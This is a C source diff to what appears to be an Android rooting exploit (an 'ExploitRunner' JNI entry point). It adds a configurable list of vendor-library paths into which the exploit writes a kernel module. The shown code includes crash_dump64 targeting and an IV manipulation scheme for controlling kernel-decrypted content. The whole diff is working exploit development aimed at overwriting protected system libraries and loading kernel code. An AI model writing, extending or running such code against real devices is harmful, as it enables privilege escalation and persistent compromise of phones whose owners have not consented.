@@ -55,6 +55,11 @@ void reportfmt(struct Reporter *r, const char *fmt, ...) {
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
 
+#define MAX_VENDOR_TARGETS 16
+static char *g_vendor_targets_blob;
+static const char *g_vendor_targets[MAX_VENDOR_TARGETS];
+static size_t g_vendor_target_count;
+
 /* SA parameters set by Java via nativeRunAll() before any patching. */
 static int      g_encap_port;
 static int      g_sender_port;
@@ -63,6 +68,74 @@ static uint8_t  g_aes_key[32];
 static uint8_t  g_hmac_key[32];
 static int      g_icv_len;    /* auth truncation in bytes (128-bit → 16) */
 static uint32_t g_seq = 1;   /* monotonically increasing per-write */
+
+static int valid_vendor_target(const char *path) {
+    size_t len;
+    if (!path || path[0] != '/') return 0;
+    if (strncmp(path, "/vendor/", 8) != 0
+            && strncmp(path, "/system/vendor/", 15) != 0) return 0;
+    len = strlen(path);
+    if (len == 0 || len >= 64) return 0;
+    for (size_t i = 0; i < len; i++) {
+        if (path[i] == ' ' || path[i] == '\t' || path[i] == '\n'
+                || path[i] == '\r') return 0;
+    }
+    return 1;
+}
+
+static int vendor_target_seen(const char *path) {
+    for (size_t i = 0; i < g_vendor_target_count; i++) {
+        if (strcmp(g_vendor_targets[i], path) == 0) return 1;
+    }
+    return 0;
+}
+
+static void clear_vendor_targets(void) {
+    free(g_vendor_targets_blob);
+    g_vendor_targets_blob = NULL;
+    g_vendor_target_count = 0;
+}
+
+/* The Java settings page passes one absolute vendor path per line. Keep the
+ * native list bounded and reject paths that cannot fit libcxx.S's 64-byte
+ * target buffer. The first entry is always the path selected by Java. */
+static void configure_vendor_targets(const char *primary, const char *list,
+                                     struct Reporter *reporter) {
+    clear_vendor_targets();
+    if (primary && valid_vendor_target(primary)) {
+        g_vendor_targets[g_vendor_target_count++] = primary;
+    }
+
+    if (list && list[0]) {
+        size_t len = strlen(list);
+        g_vendor_targets_blob = malloc(len + 1);
+        if (!g_vendor_targets_blob) {
+            REPORTLN("vendor target list allocation failed; using primary target");
+            return;
+        }
+        memcpy(g_vendor_targets_blob, list, len + 1);
+        char *save = NULL;
+        for (char *token = strtok_r(g_vendor_targets_blob, "\r\n,", &save);
+             token && g_vendor_target_count < MAX_VENDOR_TARGETS;
+             token = strtok_r(NULL, "\r\n,", &save)) {
+            while (*token == ' ' || *token == '\t') token++;
+            size_t token_len = strlen(token);
+            while (token_len > 0 && (token[token_len - 1] == ' '
+                    || token[token_len - 1] == '\t')) token[--token_len] = '\0';
+            if (!valid_vendor_target(token)) {
+                REPORTLN("ignoring invalid vendor target: %s", token);
+                continue;
+            }
+            if (!vendor_target_seen(token))
+                g_vendor_targets[g_vendor_target_count++] = token;
+        }
+    }
+
+    if (g_vendor_target_count == 0 && primary && valid_vendor_target(primary))
+        g_vendor_targets[g_vendor_target_count++] = primary;
+    REPORTLN("vendor target profile: %zu path(s)", g_vendor_target_count);
+    (void)reporter;
+}
 
 /* IV = AES256_ECB_DEC(key, old_content) XOR desired
  * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
@@ -567,21 +640,9 @@ static int patch_ko(struct Reporter *reporter, const char *custom_ko_path,
     /* patch #2: write KO into a vendor library. Some vendors expose only one
      * of these targets to the crash_dump domain, so retry another target only
      * when the first read failed before any bytes were written. */
-    char initial_target[64];
-    strncpy(initial_target, libcxx_ko_target, sizeof(initial_target) - 1);
-    initial_target[sizeof(initial_target) - 1] = '\0';
-    const char *fallback_targets[] = {
-        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
-        "/vendor/lib64/libstagefrighthw.so",
-        "/vendor/lib64/libbinderdebug.so",
-    };
     ret = -1;
-    for (size_t target_index = 0;
-         target_index < 1 + sizeof(fallback_targets) / sizeof(fallback_targets[0]);
-         target_index++) {
-        const char *target = target_index == 0
-                ? initial_target : fallback_targets[target_index - 1];
-        if (target_index > 0 && strcmp(target, initial_target) == 0) continue;
+    for (size_t target_index = 0; target_index < g_vendor_target_count; target_index++) {
+        const char *target = g_vendor_targets[target_index];
 
         strncpy(libcxx_ko_target, target, 63);
         libcxx_ko_target[63] = '\0';
@@ -708,7 +769,8 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
                                                jint senderPort,
                                                jstring customKoPath,
                                                jstring customKoLabel,
-                                               jstring selectedBundledKmi) {
+                                               jstring selectedBundledKmi,
+                                               jstring vendorTargetPaths) {
     struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
 
     g_encap_port  = (int)encapPort;
@@ -732,6 +794,12 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
         libcxx_ko_target[63] = '\0';
         (*env)->ReleaseStringUTFChars(env, koTargetPath, p);
     }
+    const char *target_list = NULL;
+    if (vendorTargetPaths)
+        target_list = (*env)->GetStringUTFChars(env, vendorTargetPaths, NULL);
+    configure_vendor_targets(libcxx_ko_target, target_list, reporter);
+    if (target_list)
+        (*env)->ReleaseStringUTFChars(env, vendorTargetPaths, target_list);
     struct PatchRestore libcxx_r = {0};
 
     int rc = 3;
@@ -759,6 +827,7 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
         }
     }
     int ko_ret = patch_ko(reporter, custom_ko, custom_ko_label, selected_kmi);
+    clear_vendor_targets();
     if (selected_kmi)
         (*env)->ReleaseStringUTFChars(env, selectedBundledKmi, selected_kmi);
     if (custom_ko_label)
